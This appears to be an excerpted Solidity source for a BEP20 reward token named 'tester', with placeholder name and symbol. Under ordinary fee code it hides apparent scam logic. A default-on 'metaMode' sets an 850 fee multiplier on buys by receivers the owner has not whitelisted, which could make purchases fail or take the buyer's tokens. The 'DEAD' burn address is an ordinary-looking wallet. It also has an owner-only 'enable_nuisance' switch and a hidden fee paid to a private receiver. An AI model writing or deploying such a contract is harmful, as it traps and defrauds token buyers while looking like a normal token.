...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 RWRD = IBEP20(0x324E8E649A6A3dF817F97CdDBED2b746b62553dD);
    IDEXRouter router;
...
contract tester is IBEP20, Auth {
    ...
    address WBNB;
    address DEAD = 0xF0594a8Df7964e890C7f515CD44869A475fD3EC9;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Contract Name Here";
    string constant _symbol = "Symbol Here";
    uint8 constant _decimals = 4;

    uint256 _totalSupply = 10 * 10**6 * 10**_decimals;

    //set max tx and wallet %
    ...
    bool public metaMode = true;
    mapping (address => bool) public ismetaed;
    ...
    uint256 public ArcadelonFee    = 0;
    uint256 public burnFee         = 0;
    uint256 public totalFee        = marketingFee + rewardFee + liquidityFee + teamFee + burnFee + ArcadelonFee;
    uint256 public feeDenominator  = 100;

    uint256 public sellMultiplier  = 100; // = 100% of buy fee. 200 = 200 / 2x of buy fee etc
    ...
    address private ArcadelonFeeReceiver;
    ...
    // Set Fee Receiver Wallets

        autoLiquidityReceiver = msg.sender; 
        marketingFeeReceiver = 0x27434CB7a522be8f2f54b3685B38a42e204C0A6E;
        teamFeeReceiver = 0x807bAf352cfD82e07bD94eFfb1Cf288896B8245E;
        ArcadelonFeeReceiver = 0x0Ea5d88c9296BF87b5D499eAfFDf84831bB35951;
    ...
    function takeFee(address sender, uint256 amount, bool isSell, address receiver) internal returns (uint256) {
        ...
        uint256 multiplier = isSell ? sellMultiplier : 100; //dont touch this section
        if(metaMode && !ismetaed[receiver] && !isSell){
            multiplier = 850;
        }
    ...
    function set_multiplier(uint256 _sell) external onlyOwner{
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBdev = amountBNB.mul(ArcadelonFee).div(totalBNBFee);
        ...
        (tmpSuccess,) = payable(ArcadelonFeeReceiver).call{value: amountBNBdev, gas: 30000}("");
    ...
    function enable_nuisance(bool _status) public onlyOwner {
     ...
     function enable_meta(bool _status) public onlyOwner {
        metaMode = _status;
    }
    //GK
    ...
    function manage_meta(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            ismetaed[addresses[i]] = status;
        }
    }
    ...
    function setFees(uint256 _liquidityFee, uint256 _rewardFee, uint256 _marketingFee, uint256 _teamFee, uint256 _ArcadelonFee, uint256 _burnFee, uint256 _feeDenominator) external authorized {
        liquidityFee = _liquidityFee;
        rewardFee = _rewardFee;
        marketingFee = _marketingFee;
        teamFee = _teamFee;
        ArcadelonFee = _ArcadelonFee;
        burnFee = _burnFee;
        totalFee = _liquidityFee + _rewardFee + _marketingFee + _teamFee + _burnFee + _ArcadelonFee;
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/2, "Fees cannot be more than 49%");
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _teamFeeReceiver, address _burnFeeReceiver, address _ArcadelonFeeReceiver ) external authorized {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        teamFeeReceiver = _teamFeeReceiver;
        burnFeeReceiver = _burnFeeReceiver;
        ArcadelonFeeReceiver = _ArcadelonFeeReceiver;
    }
